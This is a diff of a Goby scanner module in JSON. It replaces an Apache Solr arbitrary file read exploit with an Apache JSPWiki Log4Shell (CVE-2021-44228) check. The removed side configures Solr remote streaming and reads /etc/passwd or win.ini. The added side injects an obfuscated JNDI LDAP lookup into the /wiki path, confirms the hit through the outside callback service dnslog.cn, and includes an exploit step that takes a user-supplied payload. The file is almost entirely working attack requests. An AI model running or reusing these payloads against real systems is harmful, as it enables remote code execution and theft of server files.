@@ -1,40 +1,42 @@
 {
-      "Name": "Apache Solr Arbitrary File Read",
-      "Level": "2",
-      "Tags": ["fileread"],
-      "GobyQuery": "app=\"Solr\"",
-      "Description": "Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.",
-      "Product": "Apache Solr",
-      "Homepage": "https://solr.apache.org/",
-      "Author": "PeiQi",
-      "Impact": "<p>Read any file on the server</p>",
-      "Recommandation": "<p>undefined</p>",
-      "References": [
-            "http://wiki.peiqi.tech"
+      "Name": "Apache JSPWiki Log4shell CVE-2021-44228 (2)",
+      "Level": "3",
+      "Tags": [
+            "rce"
       ],
-	  "HasExp": true,
-	  "ExpParams": [
-		{
-			"name": "file",
-			"type": "createSelect",
-			"value": "/etc/passwd,\\\\127.0.0.1\\c$\\Windows\\win.ini",
-			"show": ""
-			}
-	  ],
-	  "ExpTips": {
-		"Type": "",
-		"Content": ""
-	  },
+      "GobyQuery": "(body=\"<div>JSPWiki\" | title=\"JSPWiki\")",
+      "Description": "Apache JSPWiki /wiki存在log4j漏洞。",
+      "Product": "JSPWiki",
+      "Homepage": "https://jspwiki.apache.org/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://mp.weixin.qq.com/s?__biz=MzA5OTA0MTU4Mg==&mid=2247485581&idx=1&sn=033cafb1442d44e6cfc85796e42f206d"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "$%7Bjndi:ldap:$%7B::-/%7D/xxxdnslog.cn/tea%7D"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
       "ScanSteps": [
             "AND",
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
-                        "follow_redirect": true,
-                        "header": {},
+                        "uri": "http://www.dnslog.cn/getdomain.php",
+                        "follow_redirect": false,
+                        "header": null,
                         "data_type": "text",
-                        "data": ""
+                        "data": "",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -46,29 +48,49 @@
                                     "operation": "==",
                                     "value": "200",
                                     "bz": ""
-                              },
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "dnstest|lastbody||"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/wiki/$%7Bjndi:ldap:$%7B::-/%7D/{{{dnstest}}}/tea%7D",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
                               {
                                     "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "responseHeader",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
                                     "bz": ""
                               }
                         ]
                   },
-                  "SetVariable": []
-            }
-      ],
-	  "ExploitSteps": [
-            "AND",
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
+                        "uri": "http://www.dnslog.cn/getrecords.php",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": null,
                         "data_type": "text",
-                        "data": ""
+                        "data": "",
+                        "set_variable": []
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -85,71 +107,46 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "responseHeader",
+                                    "value": "{{{dnstest}}}",
                                     "bz": ""
                               }
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
-                  ]
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "set_variable":["solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","],
-                        "uri": "/solr/{{{solrCore}}}/config",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/json"
-                        },
-                        "data_type": "text",
-                        "data": "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": []
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "uri": "/solr/{{{solrCore}}}/debug/dump?param=ContentStreams",
-                        "follow_redirect": false,
-                        "header": {
-                              "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        "data_type": "text",
-                        "data": "stream.url=file://{{{file}}}"
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                  "output|lastbody|regex|(?s)\"stream\":\"(.*)\"}]"
+                        "output|lastbody|regex|"
                   ]
             }
       ],
-      "PostTime": "2021-03-27 17:17:15",
-      "GobyVersion": "1.8.254"
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/wiki/{{{cmd}}}",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-12-27 15:00:47",
+      "GobyVersion": "1.9.310"
 }
